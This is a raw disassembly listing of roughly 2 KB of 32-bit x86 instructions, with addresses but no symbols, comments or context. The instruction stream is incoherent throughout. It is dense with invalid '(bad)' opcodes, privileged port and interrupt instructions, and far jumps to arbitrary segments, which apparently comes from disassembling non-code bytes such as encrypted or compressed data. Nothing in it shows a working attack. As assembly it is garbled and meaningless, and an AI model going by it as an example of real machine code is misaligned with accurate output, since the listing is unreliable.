  41c348:	icebp  
  41c349:	push   ss
  41c34a:	mov    al,ds:0x123459d3
  41c34f:	stos   DWORD PTR es:[edi],eax
  41c350:	cld    
  41c351:	stos   BYTE PTR es:[edi],al
  41c352:	cmp    DWORD PTR [eax],ebp
  41c354:	push   esi
  41c355:	mov    dh,0x3e
  41c357:	imul   esi,DWORD PTR [edi+0x131154ef],0xffffff80
  41c35e:	jecxz  0x41c3c3
  41c360:	ror    BYTE PTR [esi+0x558aadf1],0xf4
  41c367:	jb     0x41c32e
  41c369:	cmp    eax,0x96cbb4f3
  41c36e:	and    ah,BYTE PTR [ebx+0xef1aea]
  41c374:	pop    edi
  41c375:	push   edx
  41c376:	mov    BYTE PTR [edx],bh
  41c378:	or     cl,BYTE PTR [edi+0x29563f7e]
  41c37e:	add    eax,0x31d94640
  41c383:	dec    eax
  41c384:	mov    dl,0xbc
  41c386:	mov    esp,0x33bc94de
  41c38b:	mov    bh,0xdd
  41c38e:	pushf  
  41c38f:	into   
  41c390:	mov    ecx,0x9fb177c2
  41c395:	push   esi
  41c396:	xchg   ebp,eax
  41c397:	jmp    0x85a0:0xc64fed2d
  41c39e:	push   edx
  41c39f:	in     eax,0xdc
  41c3a1:	retf   0xed3b
  41c3a4:	sub    bh,BYTE PTR [ebx]
  41c3a6:	dec    esp
  41c3a7:	sub    al,0xe6
  41c3a9:	mov    ch,0xe2
  41c3ab:	enter  0xa1a,0x51
  41c3af:	jp     0x41c33a
  41c3b1:	jo     0x41c385
  41c3b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3b4:	popf   
  41c3b5:	loope  0x41c365
  41c3b7:	(bad)  
  41c3b9:	cli    
  41c3ba:	in     eax,0xc3
  41c3bc:	jp     0x41c3d3
  41c3be:	test   DWORD PTR [ebx+esi*4],ebx
  41c3c1:	loop   0x41c3f0
  41c3c3:	int3   
  41c3c4:	jbe    0x41c3fa
  41c3c6:	push   DWORD PTR [esi-0x47]
  41c3c9:	enter  0x1c4b,0xdd
  41c3cd:	and    eax,0xd6aa7c16
  41c3d2:	sahf   
  41c3d3:	call   0x4ba9:0xf7bbd299
  41c3da:	fidiv  DWORD PTR [edx]
  41c3dc:	ja     0x41c366
  41c3de:	xchg   ebp,eax
  41c3df:	cmp    DWORD PTR [ecx-0x29],esp
  41c3e2:	dec    edx
  41c3e3:	adc    eax,0xd296641c
  41c3e8:	aam    0x50
  41c3ea:	xor    al,BYTE PTR [ebp+0x1f2a042]
  41c3f0:	cli    
  41c3f1:	adc    al,0x3b
  41c3f3:	sti    
  41c3f4:	call   0x5aa31e8a
  41c3f9:	(bad)
  41c3fe:	add    ecx,DWORD PTR [ebx+0xa]
  41c401:	sub    DWORD PTR [edx-0x6b],0xe5dc6bdb
  41c408:	test   bl,0xd8
  41c40b:	mov    ds:0x6b6edda0,eax
  41c410:	gs ret 0xb273
  41c414:	pop    edi
  41c415:	(bad)  
  41c416:	out    dx,eax
  41c417:	cmp    al,0xa4
  41c419:	xor    DWORD PTR [eax-0x38640c39],esp
  41c41f:	sub    al,BYTE PTR [ebp+0xc826add]
  41c425:	aad    0xd0
  41c427:	shl    BYTE PTR [ebx+0x117b9a2e],cl
  41c42d:	push   ecx
  41c42e:	xor    ebx,DWORD PTR [eax+0x5b]
  41c431:	adc    edi,DWORD PTR [edi+edi*4-0x55cbab5c]
  41c438:	aad    0x48
  41c43a:	xchg   BYTE PTR ds:0xe18c6fa1,ch
  41c440:	jo     0x41c46c
  41c442:	or     DWORD PTR [esi],0x58
  41c445:	sub    DWORD PTR [eax+0x1006ecc8],esp
  41c44b:	loope  0x41c47e
  41c44d:	jnp    0x41c43c
  41c44f:	pusha  
  41c450:	ret    
  41c451:	cmp    eax,0x2f9b111b
  41c456:	fcmove st,st(5)
  41c458:	lods   al,BYTE PTR ds:[esi]
  41c459:	sub    eax,0x125cb180
  41c45e:	cmp    al,0x93
  41c460:	out    0x8b,al
  41c462:	push   ds
  41c463:	or     eax,0xef07d322
  41c468:	mov    bh,0xd
  41c46a:	nop
  41c46b:	out    0x4c,eax
  41c46d:	int    0xe3
  41c46f:	ds sub eax,esp
  41c472:	inc    eax
  41c473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c474:	cmc    
  41c475:	or     al,0x17
  41c477:	xor    DWORD PTR [ecx+edx*2-0x1fd630db],edi
  41c47e:	int3   
  41c47f:	mov    al,ds:0x7a7003c6
	...
  41c490:	add    BYTE PTR [edi+ecx*2+0x53ff531c],dh
  41c497:	(bad)  
  41c498:	out    dx,eax
  41c499:	inc    esi
  41c49a:	dec    esp
  41c49b:	add    eax,0x55e77832
  41c4a0:	ficom  DWORD PTR [ebx]
  41c4a2:	inc    ecx
  41c4a3:	add    DWORD PTR [eax],eax
  41c4a5:	stos   DWORD PTR es:[edi],eax
  41c4a6:	add    eax,DWORD PTR [eax]
  41c4a8:	add    BYTE PTR ds:0xccc53929,al
  41c4ae:	pop    ebx
  41c4af:	or     BYTE PTR [ecx-0x74],dh
  41c4b2:	call   0x8182d197
  41c4b7:	adc    esp,edx
  41c4b9:	mov    eax,0xf6f4fce3
  41c4be:	data16 sub BYTE PTR [edx+0x7bf4668c],0x55
  41c4c6:	xor    DWORD PTR [edx-0x4f],eax
  41c4c9:	push   ds
  41c4ca:	add    DWORD PTR [eax+esi*4-0x6d2a81d3],edi
  41c4d1:	mov    eax,0xb194d33b
  41c4d6:	mov    WORD PTR [ecx+0x66],es
  41c4d9:	jp     0x41c52c
  41c4db:	xchg   BYTE PTR [ebx],bl
  41c4dd:	adc    dh,bh
  41c4df:	and    DWORD PTR [ecx],esi
  41c4e1:	sbb    eax,eax
  41c4e3:	sub    DWORD PTR [ebx],ebp
  41c4e5:	adc    al,BYTE PTR [ebp+0x55]
  41c4e8:	jno    0x41c49c
  41c4ea:	sub    eax,0xad76b5a1
  41c4ef:	xor    DWORD PTR [edx],0xffffff83
  41c4f2:	pop    es
  41c4f3:	lods   eax,DWORD PTR ds:[esi]
  41c4f4:	xchg   ebp,eax
  41c4f5:	push   si
  41c4f7:	test   eax,0xc91b9a55
  41c4fc:	out    dx,al
  41c4fd:	mov    ah,0x53
  41c4ff:	mov    ebx,edi
  41c501:	aam    0x71
  41c503:	mov    eax,0x62bf2720
  41c508:	jo     0x41c566
  41c50a:	xor    al,0x33
  41c50c:	pop    esp
  41c50d:	mov    esp,0xcfc67258
  41c512:	std    
  41c513:	push   eax
  41c514:	adc    al,0xc5
  41c516:	lds    ebx,FWORD PTR [eax+0x3a7a2ef0]
  41c51c:	(bad)  
  41c51d:	in     al,0x74
  41c51f:	rcr    DWORD PTR [ebp-0x8],1
  41c522:	in     al,0xc7
  41c524:	pop    ecx
  41c525:	jmp    0x65ac4737
  41c52a:	mov    esi,0xb2f1f73e
  41c52f:	aaa    
  41c530:	retf   
  41c531:	(bad)  
  41c532:	jmp    ebx
  41c534:	dec    edx
  41c535:	adc    edx,ebp
  41c537:	cmp    al,0x77
  41c539:	mov    dl,0xb
  41c53b:	jno    0x41c510
  41c53d:	jmp    0x41c572
  41c53f:	aam    0x17
  41c541:	sbb    eax,0x1678cf8
  41c546:	loope  0x41c55d
  41c548:	lock inc eax
  41c54a:	dec    ecx
  41c54b:	daa    
  41c54c:	xchg   BYTE PTR [ebp+eiz*2-0x2c],dh
  41c550:	leave  
  41c551:	dec    ebx
  41c552:	push   0x40
  41c554:	std    
  41c555:	jns    0x41c5ad
  41c557:	mov    al,ds:0xbcc7e889
  41c55c:	sbb    BYTE PTR [edx+0x74],0xf7
  41c560:	ins    BYTE PTR es:[edi],dx
  41c561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c562:	pop    eax
  41c563:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c564:	popa   
  41c565:	xchg   edx,eax
  41c566:	(bad)  
  41c568:	leave  
  41c569:	fadd   DWORD PTR [esi-0x68c16c6f]
  41c56f:	lock mov bh,0xe5
  41c572:	in     eax,dx
  41c573:	es cld 
  41c575:	iret   
  41c576:	ret    0xcb88
  41c579:	or     ch,al
  41c57b:	xchg   DWORD PTR [esi],esi
  41c57d:	out    dx,eax
  41c57e:	and    eax,0xc5dcdc9c
  41c583:	dec    edx
  41c584:	xor    ecx,DWORD PTR [ebx+0x2a87d061]
  41c58a:	arpl   WORD PTR [ebp-0x5a0644ec],cx
  41c590:	fwait
  41c591:	rcr    BYTE PTR [edx],0x60
  41c594:	test   al,0x22
  41c596:	xor    ebp,DWORD PTR [ebx]
  41c598:	push   ebx
  41c599:	mov    bl,0x6e
  41c59b:	out    0x55,eax
  41c59d:	adc    ebx,esp
  41c59f:	rcl    BYTE PTR [esi-0x6a71c978],cl
  41c5a5:	pushf  
  41c5a6:	hlt    
  41c5a7:	ds iret 
  41c5a9:	add    DWORD PTR [ebx],eax
  41c5ab:	sahf   
  41c5ac:	inc    edx
  41c5ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5ae:	mov    edi,edx
  41c5b0:	nop
  41c5b1:	or     eax,0x73661b5f
  41c5b6:	jp     0x41c5fb
  41c5b8:	mov    ds:0x4589d358,al
  41c5bd:	xchg   edi,eax
  41c5be:	icebp  
  41c5bf:	mov    ebx,DWORD PTR [eax+0x7d0b361a]
  41c5c5:	loope  0x41c639
  41c5c7:	mov    ?,ebx
  41c5c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5ca:	push   edx
  41c5cb:	lea    eax,[eax-0x32113e5e]
  41c5d1:	push   ss
  41c5d2:	lahf   
  41c5d3:	in     al,0xa
  41c5d5:	xchg   edi,eax
  41c5d6:	or     bl,dl
  41c5d8:	and    dl,BYTE PTR [ebp-0xa]
  41c5db:	fsub   DWORD PTR [ebx+edx*2]
  41c5de:	xchg   edi,edx
  41c5e0:	and    ch,dl
  41c5e2:	pop    ebx
  41c5e3:	sub    DWORD PTR [edi],edx
  41c5e5:	xchg   BYTE PTR [edx+eiz*8+0x30e0ba04],dh
  41c5ec:	(bad)  [ebx]
  41c5ee:	xchg   esi,eax
  41c5ef:	inc    esp
  41c5f0:	cmp    ebx,DWORD PTR ds:0x7a2972cf
  41c5f6:	dec    eax
  41c5f7:	xchg   ebp,eax
  41c5f8:	inc    eax
  41c5f9:	and    eax,0x6a65b855
  41c5fe:	push   edx
  41c5ff:	adc    DWORD PTR [eax+0x5b0df967],esp
  41c605:	test   esi,edi
  41c607:	adc    eax,0xa40d7705
  41c60c:	je     0x41c618
  41c60e:	fimul  WORD PTR [edx]
  41c610:	or     dl,BYTE PTR [ebx]
  41c612:	aas    
  41c613:	pop    eax
  41c614:	inc    esi
  41c615:	ins    DWORD PTR es:[edi],dx
  41c616:	mov    cl,ah
  41c618:	loope  0x41c65a
  41c61a:	jae    0x41c641
  41c61c:	in     al,dx
  41c61d:	push   ds
  41c61e:	pop    edx
  41c61f:	xchg   esp,eax
  41c620:	jge    0x41c65d
  41c622:	xchg   ecx,eax
  41c623:	xchg   ebp,eax
  41c624:	sti    
  41c625:	add    ebp,ebp
  41c627:	call   0x8fadd8cf
  41c62c:	mov    BYTE PTR [ebp-0x63228477],ch
  41c632:	outs   dx,DWORD PTR ds:[esi]
  41c633:	xchg   edx,eax
  41c634:	nop
  41c635:	sar    DWORD PTR [edx-0x46],0x1f
  41c639:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c63a:	ja     0x41c616
  41c63c:	outs   dx,DWORD PTR ds:[esi]
  41c63d:	xchg   DWORD PTR [ebp+0x5f],eax
  41c640:	cdq    
  41c641:	cmp    eax,0xda377a44
  41c646:	xor    BYTE PTR [edx+0x59],0x5c
  41c64a:	outs   dx,DWORD PTR ds:[esi]
  41c64b:	leave  
  41c64c:	xor    BYTE PTR [ebp+0x1211953f],dh
  41c652:	push   ebp
  41c653:	push   ds
  41c654:	add    esi,DWORD PTR [esi]
  41c656:	cli    
  41c657:	and    eax,DWORD PTR [ebp-0x3a]
  41c65a:	cmp    cl,BYTE PTR [ebx-0x21]
  41c65d:	push   0x20
  41c65f:	inc    edx
  41c660:	int    0x4a
  41c662:	arpl   WORD PTR [eax],sp
  41c664:	rol    edi,1
  41c666:	(bad)  
  41c667:	ja     0x41c663
  41c669:	fnstcw WORD PTR [edx]
  41c66b:	jbe    0x41c694
  41c66d:	mov    dl,0xc5
  41c66f:	adc    al,0x4e
  41c671:	js     0x41c66d
  41c673:	mov    eax,ds:0x4896c14e
  41c678:	stos   BYTE PTR es:[edi],al
  41c679:	bound  eax,QWORD PTR [eax+esi*1-0x42cb3c6c]
  41c680:	mov    al,ds:0xf35281e6
  41c685:	aas    
  41c686:	aad    0x5e
  41c688:	sub    eax,0xfd6e7d7a
  41c68d:	inc    esi
  41c68e:	int    0x30
  41c690:	cwde   
  41c691:	(bad)  
  41c692:	loop   0x41c6e2
  41c694:	lahf   
  41c695:	push   edi
  41c696:	or     ecx,ebp
  41c698:	pop    ebp
  41c699:	test   eax,0xca2623dc
  41c69e:	sbb    esp,0x2b
  41c6a1:	pop    edi
  41c6a2:	ficomp WORD PTR [edi]
  41c6a4:	push   ecx
  41c6a5:	xchg   esp,eax
  41c6a6:	mov    dl,0xb0
  41c6a8:	out    dx,al
  41c6a9:	lock dec esp
  41c6ab:	test   BYTE PTR [edi],al
  41c6ad:	test   eax,0xb91fe614
  41c6b2:	mov    bl,0x13
  41c6b4:	jo     0x41c6e7
  41c6b6:	out    dx,al
  41c6b7:	cmp    bh,cl
  41c6b9:	int3   
  41c6ba:	sar    esi,1
  41c6bc:	mov    edx,0x721c834f
  41c6c1:	xor    al,0x5a
  41c6c3:	or     eax,0x7d9c845a
  41c6c8:	ror    DWORD PTR [eax+0x0],1
  41c6cb:	test   eax,0x2d397b6d
  41c6d0:	jns    0x9fed3d97
  41c6d6:	add    DWORD PTR [esi+0x3f752863],0xea481377
  41c6e0:	jnp    0x41c724
  41c6e2:	enter  0x88e6,0xd0
  41c6e6:	and    bl,cl
  41c6e8:	imul   ecx,edx,0xc43dd5cd
  41c6ee:	out    dx,al
  41c6ef:	adc    al,0x14
  41c6f1:	fcomp  QWORD PTR [eax]
  41c6f3:	popa   
  41c6f4:	(bad)  [edi-0x529383cd]
  41c6fa:	sub    eax,0x7a78015d
  41c6ff:	(bad)  
  41c701:	imul   eax,ecx,0xede2c179
  41c707:	jbe    0x8a27290f
  41c70d:	push   0x34c0e90
  41c712:	js     0x41c6da
  41c714:	ret    
  41c715:	pop    ecx
  41c716:	and    bl,BYTE PTR [eax+0x2f]
  41c719:	icebp  
  41c71a:	jle    0x41c738
  41c71c:	popa   
  41c71d:	out    dx,eax
  41c71e:	push   ebp
  41c71f:	mov    dl,0x10
  41c721:	shl    DWORD PTR [eax+eax*2],1
  41c724:	add    BYTE PTR [edi],bh
  41c726:	xchg   DWORD PTR [ebp+ecx*1-0x20b3ceb1],ebp
  41c72d:	imul   edx,DWORD PTR [ebx+edi*1+0x6e15ff1d],0xffffff9a
  41c735:	nop
  41c736:	jl     0x41c717
  41c738:	xchg   ecx,eax
  41c739:	mov    dh,0x1e
  41c73b:	aaa    
  41c73c:	mov    al,0x1c
  41c73e:	fsub   st(5),st
  41c740:	mov    DWORD PTR [esi+0x7a5a023d],ecx
  41c746:	cli    
  41c747:	ror    ah,0x9b
  41c74a:	dec    ebx
  41c74b:	aas    
  41c74c:	jae    0x41c712
  41c74e:	sub    ecx,esp
  41c750:	xchg   edi,eax
  41c751:	cmc    
  41c752:	and    DWORD PTR [edi+0x32acd451],edx
  41c758:	mov    dl,0x34
  41c75a:	or     eax,0x8d3e7bf2
  41c75f:	mov    ah,0x7a
  41c761:	jnp    0x41c715
  41c763:	jmp    0x4e86880e
  41c768:	fistp  DWORD PTR [eax+eiz*1-0x6b]
  41c76c:	(bad)  
  41c76d:	jl     0x41c74b
  41c76f:	xchg   DWORD PTR [edx-0x12e0b74f],esp
  41c775:	test   eax,0xbcee6374
  41c77a:	fisub  DWORD PTR [ebp-0xd]
  41c77d:	mov    WORD PTR [esi-0x3b],ss
  41c780:	mov    ch,0x94
  41c782:	loop   0x41c779
  41c784:	mov    ds:0xa74ca886,al
  41c789:	adc    eax,DWORD PTR [esi+0x77d0b178]
  41c78f:	jns    0x41c770
  41c791:	xchg   ebp,eax
  41c792:	sub    ebp,DWORD PTR [ebp-0xf]
  41c795:	gs popf 
  41c797:	stc    
  41c798:	cmp    BYTE PTR [eax-0x740a998f],dh
  41c79e:	std    
  41c79f:	push   0xaf08b0a8
  41c7a4:	call   DWORD PTR [esi-0x28]
  41c7a7:	stos   BYTE PTR es:[edi],al
  41c7a8:	push   0x746474c0
  41c7ad:	mov    al,0x39
  41c7af:	mov    cl,0xb7
  41c7b1:	cwde   
  41c7b2:	cmp    BYTE PTR [eax+esi*2+0x7f2430b3],ch
  41c7b9:	jo     0x41c7ae
  41c7bb:	jge    0x41c740
  41c7bd:	je     0x41c77d
  41c7bf:	mov    bl,0x84
  41c7c1:	jne    0x41c77d
  41c7c3:	jb     0x41c83b
  41c7c5:	xor    dl,BYTE PTR [edi+0x3c258b01]
  41c7cb:	add    al,0xf8
  41c7cd:	add    DWORD PTR ds:0x6103d921,edi
  41c7d3:	or     eax,0xef0fb30a
  41c7d8:	or     ah,BYTE PTR [ebx-0x2b]
  41c7db:	scas   eax,DWORD PTR es:[edi]
  41c7dc:	mov    ds:0xa4392ed4,al
  41c7e1:	pop    ecx
  41c7e2:	dec    ebp
  41c7e3:	lods   al,BYTE PTR ds:[esi]
  41c7e4:	or     eax,0x487bdb9e
  41c7e9:	push   ebp
  41c7ea:	lds    esp,FWORD PTR [edx+0x56]
  41c7ed:	push   ecx
  41c7ee:	or     eax,0x1d49c2f0
  41c7f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7f4:	mov    cl,0x5f
  41c7f6:	dec    eax
  41c7f7:	and    eax,edx
  41c7f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7fa:	xchg   edx,eax
  41c7fb:	test   DWORD PTR [ebx+esi*4],edi
  41c7fe:	scas   eax,DWORD PTR es:[edi]
  41c7ff:	sti    
  41c800:	rcr    edi,0xd8
  41c803:	or     DWORD PTR [edx],esi
  41c805:	loopne 0x41c7fa
  41c807:	ror    DWORD PTR [esi+edx*1],0xcd
  41c80b:	xchg   edx,eax
  41c80c:	repnz or DWORD PTR [esi-0x53],esp
  41c810:	cs jmp 0x28e4:0x78105fbe
  41c818:	loop   0x41c7d9
  41c81a:	int    0x7a
  41c81c:	add    eax,0x9d9bae4e
  41c821:	adc    ebx,ebp
  41c823:	jno    0x41c850
  41c825:	adc    bl,BYTE PTR [ecx+0x87a511e]
  41c82b:	popa   
  41c82c:	and    ch,BYTE PTR [edi]
  41c82e:	test   eax,0xc96a56a0
  41c833:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c834:	mul    DWORD PTR [eax]
  41c836:	test   BYTE PTR [ebx-0x27c846e8],dl
  41c83c:	sbb    dh,BYTE PTR ds:0xfc54779
  41c842:	lock sub DWORD PTR es:[esi+0x7d],eax
  41c847:	aam    0x4f
  41c849:	ins    DWORD PTR es:[edi],dx
  41c84a:	xchg   esi,eax
  41c84b:	loope  0x41c818
  41c84d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c84e:	ins    DWORD PTR es:[edi],dx
  41c84f:	jne    0x41c8c5
  41c851:	popf   
  41c852:	icebp  
  41c853:	pop    edi
	...
  41c860:	add    ah,al
  41c862:	leave  
  41c863:	or     BYTE PTR [eax-0x12131ef3],ah
  41c869:	add    BYTE PTR [esi-0x1e],al
  41c86c:	or     edi,ebx
  41c86e:	add    DWORD PTR [ebp+0x144be53],eax
  41c874:	add    BYTE PTR [ebx-0x10fffffd],ch
  41c87a:	pushf  
  41c87b:	mov    DWORD PTR [eax+ebp*1],eax
  41c87e:	fdiv   QWORD PTR [edi]
  41c880:	aaa    
  41c881:	iret   
  41c882:	ret    0xe14c
  41c885:	add    DWORD PTR [ebp+0x4],ebp
  41c888:	pop    esp
  41c889:	mov    eax,ds:0xe59ca5f3
  41c88e:	mov    edi,0xd0a5053f
  41c893:	repnz add BYTE PTR [edx+esi*2-0x2d],dl
  41c898:	mov    edi,0xd11c790c
  41c89d:	lahf   
  41c89e:	jge    0x41c8f1
  41c8a0:	adc    eax,0x46db9bd8
  41c8a5:	sub    edi,esi
  41c8a7:	jne    0x41c839
  41c8a9:	sahf   
  41c8aa:	inc    eax
  41c8ab:	push   ecx
  41c8ac:	sar    edi,1
  41c8ae:	adc    al,0xe0
  41c8b0:	jne    0x41c91c
  41c8b2:	inc    ebx
  41c8b3:	outs   dx,BYTE PTR ds:[esi]
  41c8b4:	mov    eax,0x6da03bb6
  41c8b9:	or     BYTE PTR [edi],al
  41c8bb:	push   0xffffffbe
  41c8bd:	in     al,0xd9
  41c8bf:	cdq    
  41c8c0:	outs   dx,BYTE PTR ds:[esi]
  41c8c1:	pushf  
  41c8c2:	cmc    
  41c8c3:	retf   
  41c8c4:	(bad)
  41c8c7:	inc    esi
  41c8c8:	out    0xd9,al
  41c8ca:	xor    al,0xd5
  41c8cc:	arpl   WORD PTR [esi-0x18],ax
  41c8cf:	sub    edi,DWORD PTR [ebx+0x35]
  41c8d2:	bound  ecx,QWORD PTR [ebx-0x47]
  41c8d5:	test   DWORD PTR [eax-0x240b0a6d],edx
  41c8db:	sub    al,0x38
  41c8dd:	outs   dx,DWORD PTR ds:[esi]
  41c8de:	cmp    BYTE PTR [eax],0x1
  41c8e1:	jbe    0x41c872
  41c8e3:	enter  0xb10b,0x57
  41c8e7:	inc    edi
  41c8e8:	cs mov ebx,0x6e47c4d9
  41c8ee:	sti    
  41c8ef:	call   0x9295:0xe89ac397
  41c8f6:	frstor [edi-0x5b]
  41c8f9:	aam    0x23
  41c8fb:	ins    DWORD PTR es:[edi],dx
  41c8fc:	xchg   BYTE PTR es:[esi],ah
  41c8ff:	xchg   cl,cl
  41c901:	je     0x41c8e0
  41c903:	cli    
  41c904:	cmp    DWORD PTR [ecx],edi
  41c906:	adc    edi,DWORD PTR [edi+esi*2]
  41c909:	dec    ebx
  41c90a:	mov    dh,0x56
  41c90c:	adc    DWORD PTR [ebp+0x7b21e5c4],ecx
  41c912:	(bad)  
  41c914:	jno    0x41c984
  41c916:	xor    eax,DWORD PTR [edx-0x29]
  41c919:	leave  
  41c91a:	or     al,0x1a
  41c91c:	(bad)  
  41c91d:	push   0xe2ada068
  41c922:	shl    bh,1
  41c924:	push   0xf
  41c926:	mov    ecx,0x6092567f
  41c92b:	and    al,0x55
  41c92d:	dec    esi
  41c92e:	mov    esp,0xfad375f
  41c933:	mov    ds:0x44521e83,eax
  41c938:	pop    edi
  41c939:	or     eax,0x7ef9eee2
  41c93e:	nop
  41c93f:	int3   
  41c940:	and    edi,DWORD PTR [edx+0x42]
  41c943:	lds    edi,FWORD PTR [eax+eiz*4]
  41c946:	xor    eax,ebp
  41c948:	stos   DWORD PTR es:[edi],eax
  41c949:	or     al,0xbd
  41c94b:	xor    edi,DWORD PTR [edi]
  41c94d:	xchg   ebx,eax
  41c94e:	jge    0x41c91b
  41c950:	push   0xb659dc0b
  41c955:	int    0xb2
  41c957:	jnp    0x41c9a2
  41c959:	xor    edi,DWORD PTR [edi+0xe331351]
  41c95f:	clc    
  41c960:	retf   0x85f5
  41c963:	mov    ax,ds:0x40203ddc
  41c969:	jg     0x41c9a7
  41c96b:	jb     0x41c910
  41c96d:	sbb    eax,0x6ed53113
  41c972:	in     al,dx
  41c973:	iret   
  41c974:	lock mov ebx,0xe9ecfa2
  41c97a:	push   edx
  41c97b:	ss hlt 
  41c97d:	dec    ecx
  41c97e:	(bad)  [edi+edx*1+0x410a2615]
  41c985:	scas   eax,DWORD PTR es:[edi]
  41c986:	lods   eax,DWORD PTR ds:[esi]
  41c987:	out    0x40,al
  41c989:	mov    esi,0xe1781459
  41c98e:	xlat   BYTE PTR ds:[ebx]
  41c98f:	inc    ecx
  41c990:	aad    0xa7
  41c992:	sub    BYTE PTR [ebx+0x6d2f2007],al
  41c998:	sub    BYTE PTR [esi],dh
  41c99a:	enter  0x7eb1,0x6f
  41c99e:	int    0x79
  41c9a0:	xor    al,0x2c
  41c9a2:	sub    BYTE PTR fs:[ebp+eax*2+0x3c155d63],dl
  41c9aa:	sbb    BYTE PTR [ecx+0x208df3db],0x9a
  41c9b1:	(bad)  
  41c9b2:	dec    esp
  41c9b3:	int    0xbf
  41c9b5:	nop
  41c9b6:	retf   0x6a0c
  41c9b9:	cld    
  41c9ba:	in     eax,0xcc
  41c9bc:	push   es
  41c9bd:	or     eax,0x621739fb
  41c9c2:	inc    eax
  41c9c3:	test   al,0xe3
  41c9c5:	fdiv   st,st(1)
  41c9c7:	mov    WORD PTR [ecx+0x2ca16241],?
  41c9cd:	adc    eax,0xc77b277c
  41c9d2:	push   es
  41c9d3:	or     ecx,DWORD PTR [ebx-0x1fd5eef8]
  41c9d9:	push   cs
  41c9da:	(bad)  
  41c9db:	pop    ecx
  41c9dc:	cmp    al,0x4
  41c9de:	lods   al,BYTE PTR ds:[esi]
  41c9df:	xchg   DWORD PTR [eax+0x383b071f],ebx
  41c9e5:	or     eax,ecx
  41c9e7:	push   esi
  41c9e8:	adc    esp,DWORD PTR [eax+0xd]
  41c9eb:	mov    al,ds:0xdb026ef7
  41c9f0:	adc    bl,0xdc
  41c9f3:	pop    ebp
  41c9f4:	(bad)  
  41c9f5:	int3   
  41c9f6:	cmp    eax,0x6143e8e6
  41c9fb:	jnp    0x41ca0f
  41c9fd:	add    esp,DWORD PTR [edi+0x81e30ed]
  41ca03:	std    
  41ca04:	dec    eax
  41ca05:	(bad)  
  41ca06:	jmp    0x8de2e0c5
  41ca0b:	inc    ecx
  41ca0c:	jmp    0x34475bec
  41ca11:	sbb    eax,DWORD PTR [eax+0x79]
  41ca14:	das    
  41ca15:	ja     0x41ca5c
  41ca17:	sub    DWORD PTR [edx-0x26],ecx
  41ca1a:	and    DWORD PTR ds:0xc692f653,ecx
  41ca20:	imul   bh
  41ca22:	scas   eax,DWORD PTR es:[edi]
  41ca23:	ret    0xc8b6
  41ca26:	pop    ds
  41ca27:	lods   al,BYTE PTR ds:[esi]
  41ca28:	xor    DWORD PTR [ebp+0x72],ebx
  41ca2b:	sbb    bl,BYTE PTR [ecx+0x6b]
  41ca2e:	cwde   
  41ca2f:	add    cl,BYTE PTR [esi+ebp*2]
  41ca32:	pop    ebx
  41ca33:	inc    ebp
  41ca34:	jns    0x41ca60
  41ca36:	add    esi,DWORD PTR [edi+0x3d]
  41ca39:	jmp    0x41ca9b
  41ca3b:	ins    DWORD PTR es:[edi],dx
  41ca3c:	aam    0xaa
  41ca3e:	xor    DWORD PTR [ebp-0x75],ecx
  41ca41:	ins    DWORD PTR es:[edi],dx
  41ca42:	ret    0x3a23
  41ca45:	lods   eax,DWORD PTR ds:[esi]
  41ca46:	loopne 0x41c9cf
  41ca48:	rcl    BYTE PTR [ebx],cl
  41ca4a:	cmp    cl,0x8
  41ca4d:	adc    BYTE PTR [esi+edi*2],0x79
  41ca51:	loop   0x41ca96
  41ca53:	and    al,0x5f
  41ca55:	cmp    edx,edi
  41ca57:	dec    ebx
  41ca58:	inc    esp
  41ca59:	mov    ah,0x5
  41ca5b:	cdq    
  41ca5c:	dec    esp
  41ca5d:	push   edi
  41ca5e:	lahf   
  41ca5f:	sub    BYTE PTR [edx+0x2d],bl
  41ca62:	shl    ebp,0x98
  41ca65:	and    esi,ecx
  41ca67:	fistp  QWORD PTR ds:0xe41b6858
  41ca6d:	add    esp,eax
  41ca6f:	nop
  41ca70:	mov    edx,0xac60d764
  41ca75:	push   ecx
  41ca76:	addr16 dec edx
  41ca78:	xchg   edi,eax
  41ca79:	cmp    eax,0x834df82f
  41ca7e:	call   0x2dbc:0xd03f4b4f
  41ca85:	fs sub ch,dl
  41ca88:	adc    esp,DWORD PTR [ebp-0x2042369]
  41ca8e:	mov    edi,0x6663f9f5
  41ca93:	xor    dh,BYTE PTR [edx*8+0x21d7ded5]
  41ca9a:	jp     0x41cb00
  41ca9c:	pop    edx
  41ca9d:	and    edi,edi
  41ca9f:	retf   
  41caa0:	lock or DWORD PTR [ebp+0x17],esi
  41caa4:	test   al,0xe
  41caa6:	sti    
  41caa7:	dec    esi
  41caa8:	cmp    edx,DWORD PTR [eax-0x6b]
  41caab:	nop
  41caac:	cmc    
  41caad:	(bad)  
  41caae:	and    al,0x79
  41cab0:	push   ds
  41cab1:	mov    DWORD PTR [edx-0x59352c0a],edx
  41cab7:	test   eax,0x2cd2329e
  41cabc:	je     0x41ca96
  41cabe:	out    dx,eax
  41cabf:	sub    edi,DWORD PTR [esi-0x689dfde9]
  41cac5:	stc    
  41cac6:	and    DWORD PTR gs:[ecx-0x1b],0xd1052f2c
  41cace:	sbb    BYTE PTR [ecx+0x7cb2a586],ah
  41cad4:	mov    al,0xfb
  41cad6:	xchg   edx,eax
  41cad7:	jo     0x41ca60
  41cad9:	int3   
  41cada:	pusha  
  41cadb:	test   al,0xd8
  41cadd:	jmp    0x5a0d:0x7984f476
  41cae4:	pop    ebp
  41cae5:	sbb    BYTE PTR [edi+edi*8],ch
  41cae8:	mov    BYTE PTR [esi-0x18],ah
  41caeb:	pop    ebx
  41caec:	mov    dh,bl
  41caee:	push   esi
  41caef:	popa   
  41caf0:	sbb    edi,DWORD PTR [eax-0x22f3b71b]
  41caf6:	and    esp,ebx
  41caf8:	scas   al,BYTE PTR es:[edi]
  41caf9:	cmc    
  41cafa:	stos   BYTE PTR es:[edi],al
  41cafb:	ss sub al,0xf0
  41cafe:	shr    DWORD PTR [esi],1
